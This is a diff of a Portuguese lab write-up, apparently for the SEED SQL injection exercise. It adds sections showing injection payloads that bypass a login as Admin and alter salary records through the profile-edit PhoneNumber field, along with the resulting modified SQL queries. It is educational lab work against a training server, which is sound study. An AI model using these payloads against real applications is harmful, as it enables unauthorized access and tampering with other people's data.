@@ -27,9 +27,9 @@ Colocando "Admin' OR 'a'='a" no username vai alterar a query fazendo com que a c
     WHERE name= 'Admin' or 'a'='a' and Password='';
 ```
 
-![login](login.png)
+![login](images/login.png)
 
-![info](details.png)
+![info](images/details.png)****
 
 Uma alternativa mais simples é colocar "Admin'#" no username, o que fará com que o que vem depois do '#' seja apenas um comentário, o que faz com que a condição seja verdadeira em name = 'Admin'. A nova query será então:
 
@@ -40,7 +40,7 @@ Uma alternativa mais simples é colocar "Admin'#" no username, o que fará com q
     WHERE name= 'Admin'#' and Password='';
 ```
 
-![login2](login2.png)
+![login2](images/login2.png)
 
 ### Tarefa 2.2
 
@@ -52,6 +52,52 @@ http://www.seed-server.com/unsafe_home.php?username=Admin%27%23&Password=
 
 abrindo o index.html no browser, obtemos:
 
-![info](details2.png)
+![info](images/details2.png)
+
+### Tarefa 2.3
+
+## Tarefa 3
+
+### Tarefa 3.1
+
+Primeiro é necessário fazer login. É usada a mesma estratégia da tarefa 2.
+
+![info](images/alice_login.png)
+
+Alterando o input de um dos campos na edição de perfil podemos alterar o nosso salário. Por exemplo, ao colocar "123', salary = 1000000 WHERE EID = 10000;#" no campo do Phone Number, o nosso salário é alterado para 1000000, sabendo que o nosso EID é 10000.
+
+O sql alterado ficará como o seguinte:
+
+```sql
+    UPDATE credential SET
+    nickname='',
+    email='',
+    address='',
+    Password='',
+    PhoneNumber= '123', salary = 1000000 WHERE EID = 10000;#
+    WHERE ID=;
+```
+Como se pode observar pela imagem, o salário foi alterado com sucesso.<br>
 
 
+![info](images/alice_profile.png)
+
+
+### Tarefa 3.2
+
+Para alterar o salário do Boby, sabendo que o seu EID é 20000, podemos colocar "123', salary = 1 WHERE EID = 20000;#" no campo do PhoneNumber.
+
+
+O sql alterado ficará como o seguinte:
+
+```sql
+    UPDATE credential SET
+    nickname='',
+    email='',
+    address='',
+    Password='',
+    PhoneNumber= '123', salary = 1 WHERE EID = 20000;#
+    WHERE ID=;
+```
+
+![info](images/boby_changed.png)
